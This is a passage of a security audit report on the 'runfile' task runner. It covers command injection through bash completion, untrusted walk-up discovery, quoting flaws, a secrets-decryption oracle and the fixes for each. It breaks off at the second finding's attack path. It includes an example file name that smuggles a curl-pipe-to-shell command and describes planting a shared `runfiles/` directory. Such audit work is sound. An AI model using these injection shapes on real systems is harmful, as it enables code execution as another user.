# Security Audit: runfile

**Date:** 2026-10-03 | **Commit:** `a65dba1220e3` | **Findings:** 53 (3 high, 16 medium, 20 low, 14 hardening) | **Scope:** whole repository, git history, dependencies

## Executive summary

**Three ways a repository you did not write can run code on your machine without you choosing to run anything from it.** This is the headline. The rest of the report is secondary to fixing these three.

1. **Pressing Tab can run code (SA-002).** With bash completion installed, Tab after `run` in a cloned repository can execute a command spelled in a file name, e.g. `runfiles/$(curl …|sh).run`. The generated script passes target names through `compgen -W`, which expands `$(…)` and backticks. Reproduced. A small fix to the shell script closes it.
2. **A shared directory above you can supply the targets (SA-001).** `run` uses the nearest `runfiles/` above the working directory and never checks who owns it. That means `/tmp/runfiles`, or `C:\runfiles` (creatable by any Windows user), answers for every directory beneath it that has none of its own. This is the shape of git's CVE-2022-24765. It reaches the VS Code task list, Tab completion and any `run <target>` typed there. Combined with SA-002, it becomes code execution on Tab for another local user.
3. **The core "interpolation quotes itself" promise breaks inside double quotes, heredocs and shell arithmetic (SA-003, SA-009).** `{{ value }}` is single-quoted, and single quotes are plain characters inside `"…"`. So `$ echo "Deploying {{ ARG.version }}"`, `ssh host "cd {{ ARG.dir }} && …"` and `$(( {{ ARG.n }} + 1 ))` all run `$(…)` found in the value. These are shapes the README and SHELL-CHECK-RULES.md present as correct, and `run :lint` passes them. Where a value is attacker-influenced, for instance a branch name, tag or PR title handed to a CI target, that is command injection in a trusted runfile. Reproduced, with failing regression tests.

**The secrets handling has a sharp edge too.** Any `encrypted:` string that reaches a run's environment is decrypted with the job's keys (SA-004), including a PR title passed through `env:`, which is GitHub's own recommended mitigation for script injection. A ciphertext copied from a committed `.env` comes back as plaintext wherever the job echoes that variable. Related findings:
- decrypted temp files are world-readable and survive SIGTERM (SA-011);
- secrets appear in rendered failure messages and `--dry-run` output (SA-012);
- `run :env encrypt` leaves the body of a multi-line PEM key in plaintext in the file it calls encrypted (SA-013).

**Previewing is not safe yet (SA-008).** `run --dry-run` is documented as a safe look at a project before setting it up. In fact a preview reads and prints arbitrary local files, loads `.env-file`s, and unlocks the OS keyring.

**The supply chain is in reasonable shape.**
- No dependency has an exploitable advisory: cargo-audit, OSV and pnpm audit were all run live today. Only two "unsound" notices exist, neither on a path this code uses.
- Lockfile integrity checks out.
- No committed secrets anywhere in 355 commits of history.
- Nothing looks malicious.

What is missing is end-to-end integrity of what users install. There are no checksums or signatures on releases, installers or `:update` (SA-014). The `.vsix` is packaged by an unpinned `npx @vscode/vsce` (SA-015). A third-party action is pinned by a movable tag (SA-016). Gitea jobs keep a write-capable token (SA-018). Release builds for the default update channel run on persistent shared runners (SA-019).

**The remaining findings are robustness issues in tooling that reads hostile files: crashes, hangs and memory exhaustion.** A single crafted `.run` file can abort or hang `run :list`, Tab and the language server (SA-022, SA-024). Through a symlink loop or a `.run` symlinked to `/dev/zero`, it can exhaust memory badly enough to take down the desktop session (SA-007). None executes code. SA-007 is the only one rated above low. The language server itself was proven by strace to execute nothing and write nothing.

Every high finding was re-opened at its cited lines and reproduced on the HEAD binary by the main agent (see *Coverage and limits*).

| Severity | Count |
|---|---|
| High | 3 |
| Medium | 16 |
| Low | 20 |
| Hardening notes | 14 |

**Fix first:**

- **SA-001** — Walk-up discovery trusts the nearest runfiles/ with no ownership check: a runfiles/ in a world/shared-writable ancestor (/tmp, C:\) runs as the invoking user (git CVE-2022-24765 analog) (High, confirmed)
- **SA-002** — Arbitrary command execution on Tab via bash completion (compgen -W expands malicious target file names) (High, confirmed)
- **SA-003** — Self-quoted interpolation is executed as shell code inside double-quotes and heredoc bodies ($ lines / exec shell bodies) (High, confirmed)

## Fix status

The three high findings and the mediums/lows SA-004 through SA-013, plus SA-015, SA-017 and SA-018, were fixed
after the audit, in the working tree. All **1,237** workspace tests and `run check` (fmt, clippy with warnings
denied, all six release targets) pass. The corpus sweep over the author's 1,257 runfiles is unaffected — no
shell-checker or grammar code changed in the SA-011–SA-018 batch — and still reports no new findings and no
unplaced interpolations. The regression tests in `crates/runfile-cli/tests/security_regression.rs` are no
longer `#[ignore]`d; they run with the suite.

| Finding | Status | What changed | Test |
|---|---|---|---|
| SA-001 | **Fixed** | The `runfiles/` the upward walk finds must be owned by the user, by the machine's administrators (root; `Administrators`/`SYSTEM` on Windows), or by the owner of the directory the walk started in; otherwise discovery refuses it, naming the owner. `RUNFILE_SAFE_DIRECTORIES` (paths, or `*`) opts in. New `crates/runfile-discovery/src/owner.rs` (Unix `geteuid`/`st_uid`; Windows owner SIDs via `GetNamedSecurityInfoW`). | Unit tests with a stand-in identity; verified end to end in a user namespace with a foreign-owned `runfiles/` (1.8.2 accepted it, the fix refuses it, the opt-in admits it). The Windows lookup compiles for both Windows triples but has not been run on Windows. |
| SA-002 | **Fixed** | The bash completion script reads candidates line by line and adds them escaped with `printf %q`; nothing goes through `compgen -W`. The binary no longer offers a target name holding `$`, a backtick, `<(`, `>(` or a control character, which also protects bash scripts installed by 1.8.2 or older until they are reinstalled. | `security_regression.rs`: Tab with `$( )` and backtick file names, and the 1.8.2 script verbatim against the new binary; unit tests for the filter and the script. |
| SA-003 | **Fixed** | The runner asks the shell checker's bash reading where each interpolation sits and writes the value for that place: unchanged outside quotes, escaped inside `"…"`, `${…}`, heredocs and backticks, closed and reopened inside the author's `'…'`. A value that would end its heredoc, or put a line break in a shell comment, is refused. Shells the reading does not follow (zsh, ksh, a computed `.shell`) keep the old rendering. | `security_regression.rs`: 11 forms × 13 hostile values in real bash, asserting nothing runs and the output is exact; heredoc-delimiter and comment refusals; placement unit tests in runfile-shell. |
| SA-004 | **Fixed** | `build_env` decrypts only a `.env-file`'s own values, before they are merged. An `encrypted:` value exported in the caller's shell, inherited, or written into the `.env` block (`.env.X = ARG.x`) is passed through unchanged, closing the CI decryption oracle. | `runfile-env/tests/encryption.rs`: a file value decrypts; an env-block and an exported ciphertext are handed through untouched. |
| SA-005 | **Fixed** (lint) | New `glued-list` language-check rule: a list that is its own word with a literal suffix glued onto it (`rm -rf {{ dirs }}/cache`) is refused. Narrowed to a trailing glue so the common `-Dexec.args={{ ARGS }}` / `inst={{ ARGS }};` idioms are left alone — verified against the 1,257-file corpus (zero false positives). README and `LANGUAGE-CHECK-RULES.md` updated. | `security_regression.rs` (`:lint` flags it); `tests/check.rs` for the rule and its exemptions. |
| SA-006 | **Fixed** | `sleep` and `retry … every` validate the delay (`functions::duration_secs`) instead of panicking on a huge/NaN value; `slice` saturates its length. `Host::temp_guard` cleans temp files on a `Drop`, so even a panic cannot leave a decrypted one behind. | `security_regression.rs` (no abort on `1e300`/`1e20`); `tests/eval.rs` and `tests/keys.rs` unit tests. |
| SA-007 | **Fixed** | The discovery walk classifies entries by their own (non-following) `file_type`, so a symlinked directory is never descended and a symlinked/FIFO/device `.run` is never registered, with a depth cap; every reader goes through `read_runfile`, which refuses a non-regular file (stat-before-open, so a FIFO cannot block) and caps the read. | `runfile-discovery/tests`: symlink loop yields only the real target; `read_runfile` refuses a device and a FIFO and caps a large file. |
| SA-008 | **Fixed** | A real `--dry-run` (new `Scope.preview`, distinct from the write-suppressing probe flag) confines `read_file`/`glob`/`file_exists`/… to the project (`escapes_base`) and builds the environment with no `.env-file` read and no key, so a preview cannot read `/etc/passwd` or unlock the keyring. In-project reads still work. | `security_regression.rs`: outside read is a placeholder, outside `file_exists` is false, in-project read works, an encrypted `.env-file` preview does not reach the keyring. |
| SA-009 | **Fixed** (the arithmetic-evaluating contexts) | New `arithmetic-interpolation` shell-check rule refuses a non-number interpolation in `[[ a -eq b ]]`/`-ne`/`-lt`/`-le`/`-gt`/`-ge`, `let`, and `declare -i` (type-engine–gated). `$(( ))`/`(( ))`/`$[ ]` were already made safe by SA-003's escaped rendering. The rarer name positions (`[[ -v name ]]`, `printf -v name`) and `${x:offset}` remain — they need name-injection modelling, and no corpus file uses them. | `security_regression.rs` (the `[[ -eq ]]`/`let`/`declare -i`/`(( ))`/`$(( ))` matrix); `runfile-shell/tests` for the rule and that `[` / `test` is left alone. |
| SA-010 | **Fixed** | `runfile.catalogCommand`/`runfile.lspPath` are `scope: machine` and the extension declares no untrusted-workspace support, so a workspace's settings cannot choose the program; `resolveProgram` turns a bare `run` into an absolute PATH path before every spawn, so a committed `run.exe` cannot shadow it on Windows. | `editors/vscode` `pure.test.ts`: `pathCandidates` resolution, including skipped relative/empty entries and Windows extensions. |
| SA-011 | **Fixed** | `temp_file`, `temp_dir` and `decrypt`'s destination are created `0600`/`0700` on Unix (`private_file_options`, `create_private_dir`, `write_private` — the last re-applies `set_permissions(0o600)`, since `OpenOptions::mode` only takes effect on creation, so an existing file is narrowed too); a no-op on Windows. The interrupt handler now also catches SIGTERM/SIGHUP/SIGQUIT (Unix) and CTRL_CLOSE/LOGOFF/SHUTDOWN (Windows), each only setting the flag so the walker stops between statements and drains the temp registry; the SA-006 `Drop` guard already covered a panic. | `runfile-lang/src/tests/io.rs`: `temp_file`/`temp_dir` are owner-only, and `write_private` narrows an existing `0644` file; the existing `an_interrupt_removes_the_temp_files_the_run_made` covers the flag→cleanup path the new signals share. |
| SA-012 | **Fixed** | `render` returns a display form beside the executed one: literal text verbatim, each interpolation as its source `{{ ENV.TOKEN }}` placeholder (new pure `interpolate_display`, which never evaluates, so no value can escape). `Spawn` carries `show_command`/`display`; `failed_label`, `announce` and `traced` use them, and `spawn`'s `label` (every `ExecError` message) is built from the display command — so a non-zero exit (no opt-in), a `.logging` line, and a failed-to-start error name an interpolated secret by where it comes from rather than printing it. `--dry-run` keeps resolving values (its documented contract, which the argument tests read back); that is safe because a preview already reads no `.env-file` and holds no key (SA-008), so a decrypted secret is never in scope to be previewed. | `cli.rs` `an_interpolated_secret_is_not_leaked_by_the_runner` (failure message + `.logging` both show the source form, never the value); `runfile-lang` `display_names_an_interpolation_by_source_and_never_its_value`; `dry_run_prints_resolved_commands_without_running_them` unchanged. |
| SA-013 | **Fixed** | `cmd_encrypt_file` parses the file with `runfile_env::parse_env_file` (the reader the runtime uses) instead of a line-by-line `find('=')`, so a multi-line quoted value (PEM key, certificate) is encrypted whole and a quoted or trailing-comment value is no longer silently rewritten; it then re-parses and decrypts the output and errors rather than write a file whose values would not round-trip. | `crypt.rs` `encrypt_handles_multiline_quoted_and_commented_values`: a PEM across lines, a quoted value with a trailing comment, and a plain value — asserts no plaintext survives and each decrypts back exactly. |
| SA-015 | **Fixed** | `@vscode/vsce` is pinned (exact `4.0.0`) in the extension's devDependencies and lockfile; `package.run` runs `vsce package --no-dependencies` from the pinned install instead of `npx @vscode/vsce`, which resolved the tool and its ~136 dependencies fresh from npm at release time. `pnpm-workspace.yaml` approves only the one build script the pinned tree needs. | `run vscode:package` builds the `.vsix` from the pinned tree; `pnpm install --frozen-lockfile` succeeds. |
| SA-017 | **Fixed** | New `keyring_store::is_persistent()` (false only on Linux when the backend fell back to kernel keyutils). `:env init`, `:env secret-keys add` and `:env rotate` warn (`warn_if_volatile`) when a freshly generated key lands in a volatile store, `:env secret-keys list` labels such keys, and `rotate --delete-current-key` refuses to delete the old key when the store is not persistent, so the only copy is not erased on reboot. | `keyring_keys.rs` `is_persistent_answers_without_panic_and_holds_on_persistent_platforms`; the warning paths verified manually, as they depend on the live backend. |
| SA-018 | **Fixed** | Every Gitea (`.cicd/*.yml`) and GitHub (`.github/workflows/*.yml`) workflow declares top-level `permissions: contents: read`; only the Gitea `release` job grants itself `contents: write`. Every `actions/checkout` sets `persist-credentials: false`, so third-party code in a job (cargo, npx, build scripts, the tree-sitter binary download) cannot reuse a persisted write-token to rewrite a published release. | YAML validated with a parser; least privilege is a configuration change with no runtime test. |

## Fixes that change product behavior

These need a decision before they ship. Applying them without one is how a security fix becomes an outage.

| ID | Finding | Change type | Who's affected | Suggested path |
|---|---|---|---|---|
| SA-001 | Walk-up discovery trusts the nearest runfiles/ with no ownership check: a runfiles/ in a world/shared-writable ancestor (/tmp, C:\) runs as the invoking user (git CVE-2022-24765 analog) | `behavior` | Users who legitimately rely on a runfiles/ owned by another account (e... | Ship the ownership check with a safe.directory-style opt-in and a prec |
| SA-002 | Arbitrary command execution on Tab via bash completion (compgen -W expands malicious target file names) | `behavior` | Completion candidate handling changes; target names containing shell m... | Ship the fixed bash script; users re-run `run :completions install bas |
| SA-003 | Self-quoted interpolation is executed as shell code inside double-quotes and heredoc bodies ($ lines / exec shell bodies) | `behavior` | Tightening the checker turns today's 'correct' ssh/sh -c/echo-into-rc ... | Ship the stricter check in a warn/log-only mode first, provide the rew |
| SA-004 | Decryption oracle: an `encrypted:` value arriving through the caller's environment or a `.env.X = ARG.x` assignment is decrypted with the run's private keys and handed to commands in plaintext | `behavior` | An `encrypted:` value exported in the caller's shell, or written as a ... | Keep decrypting `.env.X` values that are string literals written in th |
| SA-006 | Built-ins panic on data-driven numbers -- `sleep()` with a huge value, `slice()` with a huge length -- aborting the run before temp-file cleanup | `behavior` | A sleep/retry-delay value that previously crashed now returns a clean ... | None needed beyond the fix; both changes only tighten failure handling |
| SA-007 | Discovery follows symlinks and reads non-regular files without limit: a symlink loop, a `.run` symlinked to /dev/zero, or a FIFO exhausts memory or hangs `run :list`, Tab completion, `--help`, `:lint` and the editor | `behavior` | A project that deliberately symlinks a subdirectory inside runfiles/ (... | Prefer a visited-set over an outright symlink ban if symlinked subdire |
| SA-008 | `run --dry-run` is not side-effect free: previewing a hostile repository reads and prints arbitrary local files, loads `.env-file`s, and unlocks the OS credential store to decrypt the repository's values with the user's keys | `behavior` | Gating reads under --dry-run changes what a preview prints: a target t... | Apply read-gating only under dry_run (not to real runs), and emit a on |
| SA-009 | Interpolation in a shell arithmetic context is evaluated as code, with no quotes written and no shell-check finding | `behavior` | Files that interpolate a string-typed value into shell arithmetic woul... | Ship with a fix line pointing at number(); low churn given zero curren |
| SA-010 | Opening a trusted workspace runs a program the repository chooses, with no click: window-scoped `runfile.catalogCommand` / `runfile.lspPath` in `.vscode/settings.json`, or (Windows) a `run.exe` in the folder that shadows the real runner | `behavior` | With machine scope, a project can no longer set its own catalog comman... | Ship machine scope and mention it in the extension changelog; a projec |
| SA-012 | Failure messages, `.logging` traces and `--dry-run` previews print the rendered command, so interpolated secrets reach stderr/stdout and CI logs | `ux` | Error messages, `.logging` lines and `--dry-run` output would show `{{... | Show the source form by default and offer an explicit opt-in (e.g. `-- |
| SA-013 | `run :env encrypt` copies the body of a multi-line value (PEM key, certificate) into the 'encrypted' output in plaintext, and silently changes quoted or commented values | `behavior` | Quoted values and values with trailing comments get encrypted as the v... | Release note asking users to re-check files produced by `:env encrypt` |
| SA-014 | No install or update path verifies what it downloads: installers, `run :update` and the setup action execute release assets with no signature or checksum check, and the default (Gitea) channel's assets stay mutable after publication | `behavior` | Updates and installs would fail closed when a signature/checksum is mi... | Ship verification in the binary first while still accepting unsigned r |
| SA-017 | On Linux without a usable Secret Service, `:env init`, `:env rotate` and `:env secret-keys add` keep the only copy of a newly generated private key in kernel keyutils, which a reboot (or a few days logged out) erases | `ux` | Headless/WSL users see a warning or must opt in before a key is genera... | Ship the warning first; make the opt-in mandatory in a later release. |
| SA-020 | Encrypted values are not bound to their variable name or file (AES-256-GCM with no associated data): a ciphertext moved to another variable or file still decrypts | `data-migration` | Existing values stay v1 until rotated or re-set; afterwards renaming a... | Accept v1 indefinitely (or with a warning) and upgrade on `rotate`/`se |
| SA-021 | `run :lint` follows symlinks out of the tree it was given -- a `.run` symlink is rewritten through the link, and a directory walk descends into symlinked directories, node_modules and .git | `behavior` | A project that deliberately symlinks a .run file into runfiles/ from e... | Skip symlinked targets for writing and report them, rather than hard-f |
| SA-022 | A crafted `.run` file aborts every read-only entry point (`:list`, Tab, `--help`, `:lint`, the language server): unbounded recursion in the parser and the shell word reader, and byte slicing at non-char boundaries | `behavior` | Files nested beyond the chosen limit would newly report a syntax error... | Pick a limit (256) far above any plausible hand-written file; it is a  |
| SA-027 | Terminal escape-sequence injection: raw target names, descriptions and parallel-branch labels (glob paths, captured output, ARG/ENV values) reach the terminal unsanitised | `behavior` | Target names/descriptions containing control characters would display ... | None needed beyond the display change; purely defensive. |
| SA-028 | Command injection via target name into generated JetBrains run configuration (SCRIPT_TEXT is shell, only XML-escaped) | `behavior` | Generated JetBrains configs for target names containing shell metachar... | Regenerate configs after upgrading; existing generated files are repla |
| SA-030 | `:env decrypt`, `:env set` (plaintext) and the `decrypt()` function write `KEY=value` with no quoting, so a value holding a newline becomes extra variables and multi-line secrets do not survive the round trip | `behavior` | Decrypted and `:env set --plain` files contain double-quoted values wh... | None needed beyond a changelog line. |
| SA-031 | confirm() prompts are silently auto-approved (and the machine-wide runfiles dir disabled) whenever any of 10 CI env vars is set, including a bare CI on a developer machine | `behavior` | In a genuine CI job that both sets a CI var AND has a TTY attached, co... | Document the change; `-y` remains the explicit, environment-independen |
| SA-032 | Setup action puts its `version` input into the download URL unvalidated; dot-segments make it fetch and run an archive from any github.com repository | `behavior` | A `version` that is not latest or a release tag (e.g. a branch name, `... | None needed; the error names the accepted shapes. |
| SA-033 | `:env decrypt <src> <dst>` and `:env set` write plaintext at the default mode and only then chmod 0600, and every `:env` rewrite truncates the file in place rather than writing a temp file and renaming | `behavior` | A destination that is a symlink is replaced by a regular file instead ... | Resolve the symlink first and write the temp file next to its target i |
| SA-034 | `:env set` writes the value in plaintext, and reports success, into a file holding encrypted values whenever it does not see the public-key header (UTF-8 BOM, or a header kept in another file) | `behavior` | `:env set` without `--plain` on a headerless file now errors instead o... | Error message names `--plain` and `--key`. |
| SA-036 | Version pins that do not pin: the setup action downloads the newest release even when the action is pinned to @v1.0.0 or a SHA, and install.sh ignores the RUNFILE_VERSION the README tells users to set | `behavior` | Consumers pinned to an exact action tag or SHA would keep getting that... | Mention it in the release notes; consumers who want floating binaries  |
| SA-039 | Completion documentation renders a _shared.run binding line verbatim, so a carriage return in it injects images/links into the editor's markdown popup (tracking beacon from an opened repo) | `none` | Sanitising control characters out of completion documentation changes ... | None needed; display-only change. |
| SA-041 | Unbounded in-process `run` dispatch recursion overflows the stack and aborts the process (reachable under `--dry-run`); cycle detection only stops repeats, there is no depth cap | `behavior` | A legitimate dispatch chain deeper than the chosen cap would start err... | Set the cap well above any real use (>=128) and name it in the error s |
| SA-042 | `parallel for`/`parallel do` spawn one OS thread per branch with no concurrency cap -- a list of N items (e.g. a large `glob` or `ARGS`) spawns N threads | `performance` | `parallel for` over a large list would run at most K branches at once ... | Default the cap high enough (>= CPU count) that typical fan-outs are u |
| SA-044 | --stdin-args prompts for secret environment inputs (e.g. ENV.TOKEN) are echoed in cleartext and left in terminal scrollback | `ux` | Secret inputs would no longer echo as typed; users see no characters w... | Standard, expected behaviour for password prompts; no rollout concern. |
| SA-045 | `RUNFILE_PRIVATE_KEYS` does not keep the OS credential store out of a run: the keyring blob is always read as well, so a locked Secret Service can still prompt or block | `behavior` | Someone holding some keys in the env var and others only in the keyrin... | Implement 'store only on miss' rather than 'never the store'. |
| SA-047 | Setup action writes `secret-keys` to $GITHUB_ENV with a fixed heredoc delimiter, without validating the keys or masking each one | `behavior` | A malformed key line becomes an error at setup instead of a decryption... | The error says what shape is expected. |
| SA-048 | `RUNFILE_PRIVATE_KEYS` (the key that decrypts every `.env` secret) is passed to every child a target spawns, including `detach`ed processes | `behavior` | A script that re-invokes `run` through some other wrapper, or a tool t... | Keep it for children whose program resolves to the current executable; |
| SA-053 | On Windows/Git Bash, MSYS2 re-parses the `-c <script>` command line (de-quoting + wildcard/brace expansion), so a no-whitespace shell body with an interpolated value can lose its self-quoting and be re-globbed by bash | `behavior` | Windows users' no-whitespace `$` lines would be quoted differently; a ... | Confirm on a Windows/Git Bash runner first; the change only affects th |

### The decisions that need a person

**SA-001: ownership check on walk-up discovery.**
- *What breaks:* anyone whose project's `runfiles/` is owned by another account. That covers a shared team directory, a checkout under a service account, and above all a bind-mounted repository in a container or devcontainer, where the files' uid often differs from the user's. Git hit exactly this in 2022, and `safe.directory` complaints followed.
- *Alternatives, best first:*
  1. Refuse a `runfiles/` owned by neither the user nor root. Let an environment variable opt in to more, such as `RUNFILE_SAFE_DIRECTORIES` with a `*` wildcard. An environment variable rather than a config file, since this project removed its settings file on purpose.
  2. Stop the upward walk at the first directory the user does not own. Cheaper, but it does not cover a hostile file inside a directory the user owns.
  3. Release a warn-only version first.
- *Recommendation:* option 1, with an error that names the directory, its owner and the exact variable to set, plus a warn-only release first.
- *Cost of not fixing:* on any shared machine, another user chooses what `run` runs for you.

**SA-003 / SA-009: double-quoted, heredoc and arithmetic interpolation.** There are two ways to fix it, with very different product impact.
- *Context-aware rendering (recommended).* The runner already reads each `$` line the way bash does (runfile-shell), so it knows whether an interpolation sits inside `"…"`, a heredoc body or `$(( ))`.
  - Inside double quotes and unquoted heredocs, keep the single-quoted form and backslash-escape `$`, `` ` ``, `"` and `\`. A legitimate value then renders exactly as before, `ssh host "cd 'my dir'"` included, so a remote shell still receives it quoted. Only the injection stops working.
  - Inside arithmetic, require a number and refuse anything else at run time.
  - No existing runfile changes behaviour for well-formed values.
- *Checker-only.* Flag every double-quoted or heredoc interpolation. This breaks the documented `ssh`, `sh -c` and `echo … >> rc` patterns in every file that uses them, and would need a migration path, since those patterns have no unquoted spelling with the same meaning.
- *Recommendation:* render by context. Add a checker rule for arithmetic, which is rare (zero hits in the author's 1,257-file corpus). Correct the README and SHELL-CHECK-RULES.md, which currently teach the unsafe shapes as correct, along with the runfile-shell tests that pin them (`crates/runfile-shell/src/tests.rs:85-104`, per the sweep).

**SA-004: decryption oracle.**
- *What breaks:* decrypting only values that came from a `.env-file`, or from a `.env.X` string literal written in the file, stops honouring an `encrypted:` value exported in the caller's shell. The code comments say that is supported (runfile-env `lib.rs:250-254`). Nothing in this repository or the setup action uses it.
- *Recommendation:* do it. Keep an explicit opt-in (`RUNFILE_DECRYPT_INHERITED=1`) for anyone relying on it.
- *Cost of not fixing:* any CI job that holds keys and echoes a user-supplied variable is a plaintext oracle for the repository's committed secrets.

**SA-008 / SA-012: what previews and errors show.** Gating reads under `--dry-run` means a preview prints placeholders instead of real file contents and decrypted values. Showing the source form in failure messages means `{{ ENV.TOKEN }}` instead of the token. Both reduce how much a preview or an error reveals. That is the point, but some users read previews for exactly those values.
- *Recommendation:* make the safe form the default, with an explicit opt-in to the old behaviour (`--dry-run=full`, `RUNFILE_SHOW_VALUES=1`).
- Update the README sentence that calls `--dry-run` safe before setting a project up; until this lands, it is not true.

**SA-010: VS Code extension settings to `machine` scope.** A project can no longer set `runfile.catalogCommand` / `runfile.lspPath` in `.vscode/settings.json`. This matches what VS Code does for `git.path`. Nobody in the repository relies on it. Ship it with a changelog line.

**SA-014: release verification.**
- *What breaks:* nothing, if it is staged.
- *Staging:*
  1. Publish a `SHA256SUMS` file, plus a signature (minisign or Sigstore), with every release on both forges.
  2. Have the installers and `:update` verify it whenever it is present.
  3. Once every supported release ships one, make a missing checksum an error.
- *Cost of not fixing:* a compromised Gitea instance or storage backend can serve any binary to every `:update`, and the default channel's assets stay replaceable after publication.

**SA-005: empty list glued to text.** Making `{{ list }}text` an error when the list is empty, or making a glued list a checker finding, would refuse files that currently "work" because their list is never empty. Prefer the checker rule (a glued list interpolation is almost always a mistake, since `{{ dirs }}/cache` with two dirs renders `'a' 'b'/cache`), plus a run-time refusal for the empty case.

### Merge without a meeting

These fixes change nothing a user or integration would observe: SA-002, SA-006, SA-007 (unless someone symlinks directories inside `runfiles/`), SA-011, SA-015, SA-016, SA-018, SA-019, SA-022 to SA-026, SA-029, SA-035, SA-037, SA-038, SA-040, SA-043, SA-046, SA-049 to SA-052. The remaining rows in the table above are low-churn behaviour changes; each one's rollout note is in the table and in its finding.

## Findings

### High

#### SA-001: Walk-up discovery trusts the nearest runfiles/ with no ownership check: a runfiles/ in a world/shared-writable ancestor (/tmp, C:\) runs as the invoking user (git CVE-2022-24765 analog)

**Severity:** High | **Confidence:** Confirmed | **Category:** authorization | **CWE-426** | **Component:** `crates/runfile-discovery`

**Location**

`crates/runfile-discovery/src/lib.rs:361-371`

```rust
fn find_upward(from: &Path) -> Option<PathBuf> {
	let mut dir = Some(from);
	while let Some(d) = dir {
		let c = d.join("runfiles");
		if c.is_dir() {
			return Some(c);
		}
		dir = d.parent();
	}
	None
}
```

`crates/runfile-discovery/src/lib.rs:264-295`

```rust
fn discover_with(...) { let local = find_upward(from); ... collect(dir, &anchor, "", Origin::Local, ...) }  // no uid/ACL check on `dir` before its .run files are collected, parsed and run
```

**Attack path**

runfile has no equivalent of git's ownership check or safe.directory. find_upward() walks from the working directory toward the filesystem root and returns the FIRST ancestor containing a `runfiles/` subdirectory, checking only `c.is_dir()` -- never whether that directory (or its files) is owned by the current user or writable only by them. On a multi-user host an attacker plants a runfiles/ in a directory the victim will be at or under but that has no nearer runfiles/: on Unix the world-writable /tmp (`/tmp/runfiles/`), /var/tmp, or any group/shared-writable ancestor such as /srv or a shared project root; on Windows `C:\runfiles\`, creatable by any authenticated user under the default ACL on C:\ (the exact precondition of git CVE-2022-24765 with `C:\.git`). When the victim, from such a directory, (a) runs `run <target>` the attacker's target executes as the victim -- confirmed in this audit: a `$ touch` target planted in <ancestor>/runfiles/ ran and created its marker when the victim invoked it from a deep subdirectory with no local runfiles/; or (b) merely opens the directory in VS Code, whose extension runs `run :list --json` automatically on `onStartupFinished` (editors/vscode/package.json), populating the task list and CodeLens with the attacker's targets -- one click runs them -- and parsing the attacker's .run files (which also reaches the unbounded-read OOM/hang sink, see the companion finding); or (c) presses Tab (shell completion runs `run :complete`, which lists the attacker's targets). The machine-wide home dir is suppressed in CI but the walk-UP is always performed.

**Why existing controls don't stop it**

No ownership/uid check and no ACL check anywhere in discovery; no safe.directory-style allowlist; no setting to require same-owner. The prepare gate does not help: it only requires a `setup` target to have run, which the attacker simply omits (then gate_for returns None and enforce() is a no-op), and it is bypassed entirely by :list/:complete/--help/:lint/the VS Code catalog/the LSP, none of which execute the gate. --dir does not change the trust model -- it only moves the start of the same unchecked walk. On Unix the sticky bit on /tmp stops an attacker DELETING others' files but not CREATING /tmp/runfiles/ first. Git shipped exactly this mitigation (ownership check + safe.directory) for CVE-2022-24765; runfile has none.

**Impact**

Local privilege-boundary crossing to arbitrary command execution as the invoking user. A second local user (or any process that can write a well-known ancestor like /tmp or C:\) gets their code run by the victim the moment the victim runs any target, clicks a VS Code task/CodeLens, or (for parse-only reach: task list population, Tab, :list) opens/edits in the directory. Combined with the companion unbounded-read finding, even the parse-only reach is a memory-exhaustion DoS. This is the same class and severity git treated as a security release.

**Fix**

Before using a discovered runfiles/ (and before reading any file under it), verify it is trustworthy: on Unix require the runfiles/ directory and each .run file to be owned by the current euid (and not group/other-writable); on Windows require the owner to be the current user or an administrators group, matching git's check. Refuse (with a clear message) a runfiles/ that fails the check unless the user has opted in via a safe.directory-style allowlist -- given this project removed its settings file on purpose, an environment variable such as `RUNFILE_SAFE_DIRECTORIES` (paths, with `*` for all) is the fitting carrier; never anything the repository itself can set. At minimum, refuse a runfiles/ found above the first directory boundary that is not owned by the user, and never auto-list/parse an unowned one from :list/:complete/the extension.

**⚠ Product impact**

*Type:* `behavior`

Users who legitimately rely on a runfiles/ owned by another account (e.g. a shared tools directory owned by root or a team account, or working under a path owned by a service account) would stop discovering it until they allowlist it. CI is unaffected (home dir already suppressed; project runfiles are checked out as the job user).

*Safer rollout:* Ship the ownership check with a safe.directory-style opt-in and a precise error naming the directory and the exact allowlist line to add, exactly as git did; consider a one-time warning (log-only) release before hard enforcement to surface legitimate shared-owner setups.

**Regression test:** not-possible (see *Fix status*: unit tests with a stand-in identity, and an end-to-end check in a user namespace)

**References**

- https://github.blog/engineering/git-security-vulnerability-announced/ — git CVE-2022-24765: a .git in a shared ancestor (e.g. C:\.git) runs another user's commands; fixed with an ownership check + safe.directory; 'opening such a directory in an editor or IDE such as VS Code ... will potentially run commands defined by that other user' (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/426.html — CWE-426 Untrusted Search Path (retrieved 2026-10-03)

---

#### SA-002: Arbitrary command execution on Tab via bash completion (compgen -W expands malicious target file names)

**Severity:** High | **Confidence:** Confirmed | **Category:** injection | **CWE-78** | **Component:** `crates/runfile-cli`

**Location**

`crates/runfile-cli/src/completions.rs:491-502`

```rust
_run() {
	local cur out
	cur="${COMP_WORDS[COMP_CWORD]}"
	out="$(run :complete "$COMP_CWORD" "${COMP_WORDS[@]}" 2>/dev/null)"
	COMPREPLY=()
	case "$out" in
		*"<dirs>"*) COMPREPLY=( $(compgen -d -- "$cur") ); out="${out/<dirs>/}" ;;
		*"<files>"*) COMPREPLY=( $(compgen -f -- "$cur") ); out="${out/<files>/}" ;;
	esac
	COMPREPLY+=( $(compgen -W "$out" -- "$cur") )
}
```

`crates/runfile-cli/src/completions.rs:446-448`

```rust
let mut out: Vec<String> = node.subs.iter().map(|c| c.name.to_string()).collect();
		out.extend(targets());
		return out;
```

`crates/runfile-discovery/src/lib.rs:468-473`

```rust
let rel = p.strip_prefix(root).unwrap_or(&p).with_extension("");
		let mut name = rel
			.components()
			.map(|c| c.as_os_str().to_string_lossy())
			.collect::<Vec<_>>()
			.join(":");
```

**Attack path**

